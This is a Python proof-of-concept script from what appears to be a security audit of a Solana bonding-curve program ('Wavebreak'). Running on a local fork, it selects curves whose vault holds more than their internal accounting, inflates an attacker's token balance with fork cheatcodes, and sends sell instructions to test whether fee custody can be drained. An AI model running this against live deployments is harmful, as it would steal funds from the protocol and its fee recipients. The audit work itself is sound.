"""Wavebreak fee-custody drain test, v2 (decisive version).

Curve `6dY8neNeezK1RPzCQWZeAXMkASYjWtPe3y511VRq2L1n` had degenerate accounting (quoteAmount=28),
so failures there were arithmetic artifacts. Here the target is a curve with a large, healthy
`quoteAmount` accounting AND a materially larger vault balance, so the question "does the payout
get capped by internal accounting (fee custody protected) or by the vault balance (fee custody
drainable by any token holder)?" is measurable directly:

    payout_to_attacker  vs  (accounting_quote_before - accounting_quote_after)
    and the vault delta.
"""
import sys, json, struct, base64
sys.path.insert(0, "/home/user/orca-audit/tools")
import forknet as F
from solders.instruction import Instruction
from solders.pubkey import Pubkey

WB = "waveQX2yP3H1pVU8djGvEHmYg8uamQ84AuyGtpsrXTF"
WSOL = F.WSOL
actor = F.load_actor(); A = str(actor.pubkey())
ATA_WSOL = "HMRvmgya8xKgDsbZfLGrYEjGNeFrJSe27JBhsAE2P7jh"
CURVES = {c["address"]: c for c in json.load(open("/home/user/orca-audit/recon/wb_curves.json"))}
CUST = {r["curve"]: r for r in json.load(open("/home/user/orca-audit/recon/wb_custody_full.json"))}
OFF = {"quote_amount": 208, "base_amount": 216}


def ata_of(owner, mint, prog=F.TOKEN):
    return str(Pubkey.find_program_address([bytes(F.pk(owner)), bytes(F.pk(prog)), bytes(F.pk(mint))],
                                           F.pk(F.ATA))[0])


def read_curve(addr):
    v = F.get_account(addr)
    if not v:
        return None
    raw = base64.b64decode(v["data"][0])
    return {"lamports": v["lamports"], "hash": F.hashlib.sha256(raw).hexdigest(),
            "quote_amount": struct.unpack_from("<Q", raw, OFF["quote_amount"])[0],
            "base_amount": struct.unpack_from("<Q", raw, OFF["base_amount"])[0],
            "raw": raw}


def read_ata(addr):
    v = F.get_account(addr)
    if not v:
        return None
    raw = base64.b64decode(v["data"][0])
    return {"lamports": v["lamports"], "amount": struct.unpack_from("<Q", raw, 64)[0],
            "hash": F.hashlib.sha256(raw).hexdigest()}


def main():
    rows = []
    for a, c in CURVES.items():
        if c["quote_mint"] != WSOL or any(m["graduated"] for m in c["graduation_methods"]):
            continue
        r = CUST.get(a, {})
        if r.get("acctQuote", 0) > 10 ** 9 and r.get("divQuote", 0) > 10 ** 8:
            rows.append((r["divQuote"], a, r))
    rows.sort(reverse=True)
    print("targets (healthy accounting + big vault excess):")
    for div, a, r in rows[:5]:
        print(f"   {a:44s} acct={r['acctQuote']:>14,} vault={r['vaultQuote']:>14,} excess={div:>13,}")
    div, T, r0 = rows[0]
    c = CURVES[T]; BASE = c["base_mint"]
    VAULT = ata_of(T, WSOL); base_ata = ata_of(A, BASE)
    print(f"\nTARGET {T} baseMint={BASE} vault={VAULT}")
    _, ixc = F.create_ata(A, BASE, F.TOKEN, A)
    F.send([ixc], actor)
    mv = F.get_account(BASE); mraw = bytearray(base64.b64decode(mv["data"][0]))
    supply0 = struct.unpack_from("<Q", mraw, 36)[0]; dec = mraw[44]
    for fund, label in ((10 ** (dec + 3), "1000 tokens"), (10 ** (dec + 8), "100M tokens")):
        v2 = bytearray(base64.b64decode(F.get_account(base_ata)["data"][0]))
        struct.pack_into("<Q", v2, 64, fund)
        F.rpc.rpc("surfnet_setAccount", [base_ata, {"lamports": 2039280, "data": bytes(v2).hex(),
                                                     "owner": F.TOKEN, "executable": False}], url=F.FORK)
        F.rpc.rpc("surfnet_setSupply", [BASE, {"total": str(supply0 + fund)}], url=F.FORK)
        for tag, partial, nm in ((10, 0, "exact-in no-partial"), (10, 1, "exact-in partial"),
                                 (11, 1, "exact-out partial"), (11, 0, "exact-out no-partial")):
            amt = min(fund, 10 ** (dec + 2)) if tag == 11 else fund
            data = struct.pack("<QB", amt & (2**64 - 1), partial) + b"\x00"
            ixs = [Instruction(F.pk(WB), bytes([tag]) + data, [
                F.AM(A, writable=True, signer=True), F.AM(T, writable=True), F.AM(BASE, writable=True),
                F.AM(base_ata, writable=True), F.AM(WSOL), F.AM(VAULT, writable=True),
                F.AM(ATA_WSOL, writable=True), F.AM(F.SYSTEM), F.AM(F.ATA),
                F.AM(F.TOKEN), F.AM(F.TOKEN)])]
            b_curve, b_vault, b_att = read_curve(T), read_ata(VAULT), read_ata(ATA_WSOL)
            slot0 = F.get_slot()
            rr = F.send(ixs, actor)
            a_curve, a_vault, a_att = read_curve(T), read_ata(VAULT), read_ata(ATA_WSOL)
            det = rr.get("detail", {})
            err = det.get("err") or rr.get("error")
            payout = (a_att or {}).get("amount", 0) - (b_att or {}).get("amount", 0)
            vault_out = (b_vault or {}).get("amount", 0) - (a_vault or {}).get("amount", 0)
            acct_out = (b_curve or {}).get("quote_amount", 0) - (a_curve or {}).get("quote_amount", 0)
            base_out = (b_curve or {}).get("base_amount", 0) - (a_curve or {}).get("base_amount", 0)
            rec = {"case": f"WB-DR {nm} fund={label}", "curve": T, "mint": BASE, "amount": amt,
                   "forkSlot": slot0, "sig": rr.get("result"), "err": err,
                   "logs": [l.strip() for l in det.get("logs", [])],
                   "attackerPayout": payout, "vaultDecrease": vault_out,
                   "accountingDecrease": acct_out, "curveBaseIncrease": base_out,
                   "excessCaptured": payout - acct_out,
                   "curveBefore": {k: v for k, v in (b_curve or {}).items() if k != "raw"},
                   "curveAfter": {k: v for k, v in (a_curve or {}).items() if k != "raw"},
                   "vaultBefore": b_vault, "vaultAfter": a_vault,
                   "attackerBefore": b_att, "attackerAfter": a_att}
            RESULTS.append(rec)
            print(f"\n### {rec['case']}")
            print("   err:", json.dumps(err)[:130])
            print("   logs:", " | ".join(l.split('log:')[-1].strip() for l in rec["logs"] if 'log:' in l or 'failed' in l)[:240])
            print(f"   payout={payout:+,}  vaultDecrease={vault_out:+,}  accountingDecrease={acct_out:+,}"
                  f"  baseBurned={base_out:+,}  EXCESS_CAPTURED={rec['excessCaptured']:+,}")
            if payout > acct_out > 0 or (payout > 0 and acct_out == 0):
                print("   ***  attacker received MORE than internal accounting released  ***")
    json.dump({"target": {"curve": T, "baseMint": BASE, "vault": VAULT, "acct0": r0["acctQuote"],
                          "vault0": r0["vaultQuote"], "excess0": div},
               "funding": "FORK-ONLY: attacker's own base ATA + mint supply raised via Surfpool cheatcodes "
                          "(documented fixture funding, not exploit evidence)",
               "results": RESULTS},
              open("/home/user/orca-audit/evidence/WBD_fee_drain2.json", "w"), indent=1)
    print("\nsaved evidence/WBD_fee_drain2.json")


RESULTS = []
if __name__ == "__main__":
    main()
